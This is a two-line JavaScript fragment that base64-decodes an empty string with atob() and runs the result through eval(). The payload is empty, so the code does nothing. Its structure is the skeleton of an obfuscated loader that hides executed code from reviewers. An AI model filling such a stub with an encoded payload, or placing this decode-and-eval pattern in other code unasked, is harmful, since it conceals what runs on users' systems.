var A = "";
eval(atob(A));